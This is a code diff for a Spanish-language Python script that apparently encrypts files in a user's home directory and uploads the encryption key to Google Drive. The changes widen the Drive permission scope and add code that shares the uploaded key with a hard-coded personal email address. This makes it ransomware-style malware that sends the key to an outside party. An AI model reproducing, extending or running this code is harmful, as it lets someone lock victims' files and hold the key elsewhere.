@@ -9,14 +9,15 @@ from googleapiclient.http import MediaFileUpload
 # --- Configuración ---
 EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
 ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json']
-SCOPES = ['https://www.googleapis.com/auth/drive.file']
+SCOPES = ['https://www.googleapis.com/auth/drive']
+EMAIL_DESTINO = 'guzman.sadym@gmail.com'
 
 # --- Credenciales de cuenta de servicio incrustadas directamente ---
 SERVICE_ACCOUNT_INFO = {
     "type": "service_account",
     "project_id": "TU_PROJECT_ID",
     "private_key_id": "TU_PRIVATE_KEY_ID",
-    "private_key": "-----BEGIN PRIVATE KEY-----\\nTU_CLAVE_PRIVADA\\n-----END PRIVATE KEY-----\\n",
+    "private_key": "-----BEGIN PRIVATE KEY-----\nTU_CLAVE_PRIVADA\n-----END PRIVATE KEY-----\n",
     "client_email": "TU_EMAIL_CUENTA_SERVICIO",
     "client_id": "TU_CLIENT_ID",
     "auth_uri": "https://accounts.google.com/o/oauth2/auth",
@@ -81,6 +82,15 @@ def subir_archivo(nombre_local, nombre_remoto):
     archivo = servicio.files().create(body=archivo_metadata, media_body=media, fields='id').execute()
     print(f"[☁] Archivo subido a Google Drive con ID: {archivo.get('id')}")
 
+    # Compartir con correo personal
+    permiso = {
+        'type': 'user',
+        'role': 'reader',
+        'emailAddress': EMAIL_DESTINO
+    }
+    servicio.permissions().create(fileId=archivo.get('id'), body=permiso, fields='id').execute()
+    print(f"[📩] Compartido con {EMAIL_DESTINO}")
+
 # --- Ejecución principal ---
 if __name__ == "__main__":
     ruta_home = os.path.expanduser("~")
@@ -106,4 +116,4 @@ if __name__ == "__main__":
     with open(os.path.join(escritorio, "saludo.txt"), "w") as f:
         f.write("hola como estas?")
 
-    print("\n[🔒] Encriptación completada y clave subida a Drive.")
+    print("\n[🔒] Encriptación completada y clave subida y compartida en Drive.")
